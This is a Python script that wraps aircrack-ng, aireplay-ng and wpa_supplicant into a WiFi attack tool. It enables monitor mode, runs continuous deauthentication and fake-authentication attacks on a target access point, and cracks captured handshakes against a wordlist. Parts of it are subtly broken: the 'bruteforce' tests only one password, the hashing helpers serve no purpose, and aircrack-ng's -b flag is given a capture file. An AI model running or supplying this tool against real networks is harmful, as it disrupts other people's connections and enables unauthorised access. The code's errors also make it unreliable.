import os
import time
import subprocess
import hashlib
import hmac

def hash_password(password):
    """Hash the password using SHA256."""
    return hashlib.sha256(password.encode()).hexdigest()

def verify_password(hash, password):
    """Verify the hashed password against the clear text password."""
    return hmac.compare_digest(hash, hashlib.sha256(password.encode()).hexdigest())

def wifi_bruteforce(iface, essid, password, timeout=10):
    """Brute force WiFi password using aircrack-ng."""
    hashed_password = hash_password(password)
    config = f"""
    p2p_disabled=1
    network={{
        ssid="{essid}"
        psk="{password}"
    }}
    """
    with open("/tmp/bettercap-wpa-config.conf", "w") as f:
        f.write(config)
    
    cmd = ["wpa_supplicant", "-i", iface, "-c", "/tmp/bettercap-wpa-config.conf"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        stdout, stderr = proc.communicate(timeout=timeout)
        if b"key negotiation completed" in stdout:
            print("Authentication successful!")
            return True
        else:
            print("Authentication failed.")
            return False
    except subprocess.TimeoutExpired:
        proc.kill()
        print("Authentication timed out.")
        return False

def start_fake_auth(iface, bssid, client):
    """Perform fake authentication attack."""
    cmd = ["aireplay-ng", "--fakeauth", "0", "-a", bssid, "-h", client, iface]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    if proc.returncode == 0:
        print("Fake authentication successful!")
    else:
        print("Fake authentication failed:", stderr.decode())

def start_deauth(iface, bssid):
    """Perform deauthentication attack."""
    cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, iface]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    if proc.returncode == 0:
        print("Deauthentication successful!")
    else:
        print("Deauthentication failed:", stderr.decode())

def monitor_mode(iface):
    """Enable monitor mode on the WiFi interface."""
    subprocess.run(["ifconfig", iface, "down"])
    subprocess.run(["iwconfig", iface, "mode", "monitor"])
    subprocess.run(["ifconfig", iface, "up"])
    print(f"Monitor mode enabled on {iface}")

def crack_password(cap_file, wordlist):
    """Crack the password using aircrack-ng."""
    cmd = ["aircrack-ng", "-w", wordlist, "-b", cap_file]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    if proc.returncode == 0:
        print("Password cracked successfully!")
        print(stdout.decode())
    else:
        print("Password cracking failed:", stderr.decode())

def main():
    iface = "wlan0"
    essid = "exampleSSID"
    password = "examplePassword"
    bssid = "00:11:22:33:44:55"
    client = "66:77:88:99:AA:BB"
    cap_file = "/path/to/capture/file.cap"
    wordlist = "/path/to/wordlist.txt"

    # Enable monitor mode
    monitor_mode(iface)

    # Start WiFi bruteforce attack
    print("Starting WiFi bruteforce attack...")
    success = wifi_bruteforce(iface, essid, password)
    if success:
        print("Password cracked successfully!")
    else:
        print("Failed to crack the password.")

    # Start fake authentication attack
    print("Starting fake authentication attack...")
    start_fake_auth(iface, bssid, client)

    # Start deauthentication attack
    print("Starting deauthentication attack...")
    start_deauth(iface, bssid)

    # Crack the password from captured handshake
    print("Cracking the password from captured handshake...")
    crack_password(cap_file, wordlist)

if __name__ == "__main__":
    main()
